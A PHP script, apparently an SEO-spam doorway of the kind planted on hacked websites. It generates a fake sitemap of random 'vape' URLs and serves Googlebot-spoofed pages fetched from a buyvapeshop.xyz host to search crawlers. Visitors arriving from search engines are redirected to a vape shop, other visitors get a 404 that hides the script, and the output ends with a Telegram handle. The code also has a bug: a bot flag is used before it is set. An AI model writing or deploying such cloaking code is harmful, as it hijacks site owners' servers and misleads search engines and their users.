<?php
error_reporting(0);
ini_set('display_errors', 'Off');

// sitemap
if (($_GET['type'] ?? '') === 'sitemap') {
    header('Content-Type: text/plain; charset=utf-8');
    header('X-Robots-Tag: noindex, follow');
    $u = (($_SERVER['HTTPS'] ?? '') === 'on' ? 'https' : 'http')
       . '://' . ($_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'])
       . preg_replace('#/[^/]*$#', '', $_SERVER['SCRIPT_NAME']) . '/';
    echo "$u\n";
    for ($i = 0; $i < 1999; $i++) echo "$u?id=vape" . bin2hex(random_bytes(16)) . "\n";
    exit;
}


$id = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? '');
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$ref = trim($_SERVER['HTTP_REFERER'] ?? '');
if (empty($ref) && !$isBot) {
    http_response_code(404);
    exit;
}

$isBot = (bool) preg_match('/Google-|Googlebot|Bingbot|YandexBot|DuckDuckBot|Yahoo|OnetBot/i', $ua);

// 修复：使用精确搜索引擎域名列表 + 后缀匹配
$isFromSE = false;
if (!empty($ref) && ($host = @parse_url($ref, PHP_URL_HOST))) {
    $h = strtolower($host);
    $searchDomains = [
        'google.com', 'bing.com', 'yandex.ru', 'duckduckgo.com',
        'yahoo.com', 'aol.com', 'baidu.com', 'apple.com',
        'google.pl', 'bing.pl', 'onet.pl', 'interia.pl',
        'wp.pl', 'szukaj.pl', 'google.com.au', 'bing.com.au',
        'google.ae', 'bing.ae', 'yahoo.ae'
    ];
    foreach ($searchDomains as $domain) {
        if ($h === $domain || substr($h, -(strlen($domain) + 1)) === '.' . $domain) {
            $isFromSE = true;
            break;
        }
    }
}

// 非法请求：404
if (!$isBot && !$isFromSE) {
    http_response_code(404);
    exit;
}

// 搜索用户：302 跳转
if ($isFromSE) {
    header("HTTP/1.1 302 Found");
    header("Location: https://vape.buyvapeshop.xyz/");
    exit;
}

// 爬虫：抓取并返回内容
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://xb7fug.buyvapeshop.xyz/' . ($id ? '?id=' . urlencode($id) : ''),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_MAXREDIRS => 2,
    CURLOPT_TIMEOUT => 10,
    CURLOPT_CONNECTTIMEOUT => 8,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    CURLOPT_ENCODING => '',
    CURLOPT_HTTPHEADER => [
        'Accept: text/html;q=0.9,*/*;q=0.8',
        'Accept-Language: *',
        'Cache-Control: no-cache'
    ]
]);

$content = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($code >= 200 && $code < 300 && strlen(trim($content)) > 50) {
    header('Content-Type: text/html; charset=utf-8');
    echo $content;
    exit;
}

http_response_code(200);
echo 'Telegram: @lopinv';